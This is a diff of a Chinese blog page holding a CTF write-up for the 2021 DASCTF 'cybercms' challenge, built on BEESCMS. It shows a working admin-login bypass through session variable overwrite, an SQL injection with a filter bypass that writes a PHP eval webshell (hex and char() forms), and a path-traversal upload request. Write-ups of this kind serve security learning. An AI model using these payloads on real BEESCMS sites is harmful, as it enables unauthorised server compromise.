@@ -527,73 +527,66 @@
                 <blockquote>
 <p>本文首发于安全客：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/250048">https://www.anquanke.com/post/id/250048</a></p>
 </blockquote>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/t01657481c6d2f44643.jpg" alt=""></p>
-<h2 id="引言">引言</h2>
-<p>在前不久结束的 2021 DASCTF July X CBCTF 4th 比赛中，有一道名为 cybercms 的 web 题目。</p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/t01657481c6d2f44643.jpg"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在前不久结束的 2021 DASCTF July X CBCTF 4th 比赛中，有一道名为 cybercms 的 web 题目。</p>
 <p>预期解是从后台登录处进行 SQL 注入写入一句话木马，然而咱在做题的时候尝试了另一种思路，用的是后台登录绕过 &amp; 木马上传的打法。</p>
 <p>由于比赛的时候半天打不通就十分难受，赛后还是想不明白就来稍微深入探究了一下，经过曲折最后终于成功打通了。</p>
 <p>这篇就来记录一下做这道题时候的心路历程吧……</p>
 <hr>
-<h2 id="题目初探">题目初探</h2>
-<blockquote>
+<h2 id="题目初探"><a href="#题目初探" class="headerlink" title="题目初探"></a>题目初探</h2><blockquote>
 <p><strong>cybercms</strong></p>
 <p>赛博CMS，只为安全而生</p>
 <p>Hint: 信息搜集是一个web手必备的技能</p>
 </blockquote>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801234334015.png" alt=""></p>
-<p>很好，是 <a target="_blank" rel="noopener" href="http://www.beescms.com">BEESCMS</a>，head 里的 description 没改，正文里其实也没改完。</p>
-<p>从官网找到了 <a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1slSoqIx">官方 V4.0 源码下载</a></p>
-<p><s>（不过貌似没啥用</s> 后来发现还是有用的</p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801234334015.png"></p>
+<p>很好，是 <a target="_blank" rel="noopener" href="http://www.beescms.com/">BEESCMS</a>，head 里的 description 没改，正文里其实也没改完。</p>
+<p>从官网找到了 <a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1slSoqIx">官方 V4.0 源码下载</a>  </p>
+<p><del>（不过貌似没啥用</del> 后来发现还是有用的</p>
 <hr>
-<h2 id="后台登录绕过-上传">后台登录绕过 &amp; 上传</h2>
-<p>参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&amp;mid=2247486046&amp;idx=1&amp;sn=1b168a2f302f2cd4c97d23c22454a042">【代码审计】 beescms 变量覆盖漏洞导致后台登陆绕过分析</a>，<code>$_SESSION</code> 可以被任意覆盖。</p>
+<h2 id="后台登录绕过-amp-上传"><a href="#后台登录绕过-amp-上传" class="headerlink" title="后台登录绕过 &amp; 上传"></a>后台登录绕过 &amp; 上传</h2><p>参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&amp;mid=2247486046&amp;idx=1&amp;sn=1b168a2f302f2cd4c97d23c22454a042">【代码审计】 beescms 变量覆盖漏洞导致后台登陆绕过分析</a>，<code>$_SESSION</code> 可以被任意覆盖。</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /
 
 _SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801235205533.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801235205533.png"></p>
 <p>然后直接可以访问后台了。</p>
 <p><a target="_blank" rel="noopener" href="http://xxxxxxxxxxx/admin/admin.php">http://xxxxxxxxxxx/admin/admin.php</a></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801235307705.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210801235307705.png"></p>
 <p>参考 <a target="_blank" rel="noopener" href="https://paper.seebug.org/90/">代码审计就该这么来3 beescms getshell</a></p>
 <p>按照文中的思路，上传一个后缀为 <code>.php</code> 的一句话木马，并修改 <code>Content-Type: image/png</code> 来通过后端对文件类型的校验。</p>
 <p>然而发现他文件目录没权限上传啊，随便上传一个正常的图片也是如此……</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802004141898.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802004141898.png"></p>
 <hr>
-<h2 id="源码泄露">源码泄露</h2>
-<p>麻了，做到一半才发现有 <strong>源码泄露</strong>，<code>/www.zip</code>…</p>
+<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>麻了，做到一半才发现有 <strong>源码泄露</strong>，<code>/www.zip</code>…</p>
 <p>diff 大法好啊，看来官方源码还是有用的 2333。</p>
 <p>多了个 <code>hackable/</code> 目录，看起来只有这个目录可写的样子。<em>（虽然最后发现也不行</em></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802020136283.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802020136283.png"></p>
 <p>登录还过滤了一下 SQL 注入。</p>
 <p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802010723088.png" alt="login"></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802010647686.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802010647686.png"></p>
 <p>注意的是还把 <code>/*</code> <code>*</code> 的过滤给去掉了。</p>
 <hr>
-<h2 id="上传点源码审计">上传点源码审计</h2>
-<p>再来看上传部分的源码。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803012501659.png" alt=""></p>
+<h2 id="上传点源码审计"><a href="#上传点源码审计" class="headerlink" title="上传点源码审计"></a>上传点源码审计</h2><p>再来看上传部分的源码。</p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803012501659.png"></p>
 <p>审了一波源码，发现其实可以 <strong>构造目录穿越</strong>。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802020000717.png" alt=""></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802015859129.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802020000717.png"></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802015859129.png"></p>
 <p><code>$up_file_name2</code> 由 <code>$pic_alt</code> 而来，这个是可控的，只需要构造个目录穿越到 <code>hackable</code> 目录下就完事了。</p>
 <p>为了进到这里，上传的时候记得再把 <code>Content-Type: image/png</code> 改好， <code>is_alt</code> 设为 <code>1</code>。</p>
 <p>然而还是没打通，报错和上面的类似，也是 PHP 执行的时候文件目录没权限，只不过可以注意到文件名是 <code>.php</code> 了。</p>
 <p>（咱也不知道为啥他  <code>$pic_alt</code> 没传进来，留空的话也不是随机数，一脸懵逼</p>
 <hr>
-<h2 id="另一个上传点审计">另一个上传点审计</h2>
-<p>于是么得办法，再挖了另一个文件上传的点，考虑通过 <strong>修改已上传图片的接口</strong> 来进行上传。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011616461.png" alt=""></p>
+<h2 id="另一个上传点审计"><a href="#另一个上传点审计" class="headerlink" title="另一个上传点审计"></a>另一个上传点审计</h2><p>于是么得办法，再挖了另一个文件上传的点，考虑通过 <strong>修改已上传图片的接口</strong> 来进行上传。</p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011616461.png"></p>
 <p>相应源码如下。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803012900044.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803012900044.png"></p>
 <p>这里的 <code>$pic_path</code> 和 <code>$pic_name</code> 都是可控的，任意改一个就完事了。当然这是 PHP/5.6.40，<code>%00</code> 截断不可行 2333.</p>
 <p><strong>然而还是打不通……</strong></p>
 <p>绝绝子，挖了两条上传的路，试着绕到 <code>hackable</code> 目录也打不通……</p>
 <p><strong>看来还是文件目录的限制吧。</strong></p>
 <p>心态炸了啊啊啊啊啊。</p>
 <hr>
-<h2 id="SQL-注入写马（预期解）">SQL 注入写马（预期解）</h2>
-<p>害，赛后看了看大佬的 wp，么得办法，还是得走 SQL 注入写入文件呗。（佛了</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802224411440.png" alt=""></p>
+<h2 id="SQL-注入写马（预期解）"><a href="#SQL-注入写马（预期解）" class="headerlink" title="SQL 注入写马（预期解）"></a>SQL 注入写马（预期解）</h2><p>害，赛后看了看大佬的 wp，么得办法，还是得走 SQL 注入写入文件呗。（佛了</p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802224411440.png"></p>
 <p>再来看上面 diff 出来的关于 SQL 注入的语句。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fl_value</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
@@ -625,6 +618,8 @@ admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,n
 <pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/login.php?action=ck_login HTTP/1.1</span>
 
 user=admin%27%2F%2A%2A%2Funi%20union%20on%2F%2A%2A%2Fseselectlect%2F%2A%2A%2Fnull%2Cnull%2Cnull%2Cnull%2C0x3c3f706870206576616c28245f524551554553545b276d275d293b3f3e%2F%2A%2A%2Fin%20in%20to%2F%2A%2A%2Foutoutfilefile%2F%2A%2A%2F%27%2Fvar%2Fwww%2Fhtml%2Fupload%2Fmiao%2Ephp%27%23&amp;password=miao&amp;code=&amp;submit=true&amp;submit.x=43&amp;submit.y=24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
 <p>当然也可以用 <code>char</code> 函数写入木马。</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">'/**/uni union on/**/seselectlect/**/null,null,null,null,char(60,63,112,104,112,32,101,118,97,108,40,36,95,82,69,81,85,69,83,84,91,39,109,39,93,41,59,63,62)/**/in in to/**/outoutfilefile/**/'</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>upload<span class="token operator">/</span>miao<span class="token punctuation">.</span>php'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>进去发现果然 MySQL 就是 root 用户起来的，于是就能写入文件。</p>
@@ -641,19 +636,18 @@ PID   <span class="token environment constant">USER</span>     TIME  COMMAND
 <span class="token number">19798</span> root      <span class="token number">0</span>:00 <span class="token function">sleep</span> 5s
 <span class="token number">19799</span> www-data  <span class="token number">0</span>:00 <span class="token function">ps</span> -ef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>也有可能预期解就只有这条路可走吧。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234358803.png" alt=""></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234501858.png" alt=""></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802235011120.png" alt=""></p>
-<p>气死了，<s>下次直接 pyflag 算了</s><em>（bushi</em></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802025931112.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234358803.png"></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802234501858.png"></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802235011120.png"></p>
+<p>气死了，<del>下次直接 pyflag 算了</del><em>（bushi</em></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210802025931112.png"></p>
 <hr>
-<h2 id="上传点再探">上传点再探</h2>
-<p>噢对了，寻思着咱挖了两个上传点都整不通，实在过意不去啊。</p>
+<h2 id="上传点再探"><a href="#上传点再探" class="headerlink" title="上传点再探"></a>上传点再探</h2><p>噢对了，寻思着咱挖了两个上传点都整不通，实在过意不去啊。</p>
 <p>既然前面发现了 <code>www-data</code> 用户只有 <code>/var/html/www</code> 这个路径有权限写入，子目录么有，那可以 <strong>传到这个网站的根目录</strong> 啊！</p>
 <p>这里用的是修改图片的接口，也就是上面说的 <strong>第二处上传点</strong>。</p>
 <p>上传以后抓包修改几个地方，看图。</p>
 <p>也就是让 <code>move_uploaded_file</code> 结果是移动到网站根目录下。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011233130.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011233130.png"></p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /admin/admin_pic.php?nav=pic_list&amp;admin_p_nav=content HTTP/1.1</span>
 <span class="token header-name keyword">Host:</span> a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn
 <span class="token header-name keyword">Content-Length:</span> 1546
@@ -730,9 +724,9 @@ img/202107070904261782_thumb.jpeg
 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL--
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>pic_path</code> 留空也行。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010426175.png" alt=""></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010201021.png" alt=""></p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011420519.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010426175.png"></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803010201021.png"></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803011420519.png"></p>
 <p><strong>呐，传上来了，能用了。</strong></p>
 <p>喵喵落泪（</p>
 <hr>
@@ -748,11 +742,10 @@ img/202107070904261782_thumb.jpeg
 <span class="token variable">$pic_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pic_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//图片名称</span>
 <span class="token variable">$pic_name</span> <span class="token operator">=</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'GBK'</span><span class="token punctuation">,</span><span class="token variable">$pic_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>phpinfo 看一眼。</p>
-<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803014834724.png" alt=""></p>
+<p><img src="/2021/08/10/CTF_2021DASCTF_July_cybercms/image-20210803014834724.png"></p>
 <p>好家伙，看起来是因为没 <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libiconv/">libiconv</a> 或者 <a target="_blank" rel="noopener" href="http://www.gnu.org/software/libc/">glibc</a>，所以这里面东西就变成空了……没事了。</p>
 <hr>
-<h2 id="小结">小结</h2>
-<p>其实是一次因为想不通而开始的深入探究，唉，这题做起来不容易啊……</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实是一次因为想不通而开始的深入探究，唉，这题做起来不容易啊……</p>
 <p>感觉还是太菜了，再次落泪（</p>
 <p><em>（溜了溜了喵~</em></p>
 
@@ -1306,7 +1299,7 @@ img/202107070904261782_thumb.jpeg
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
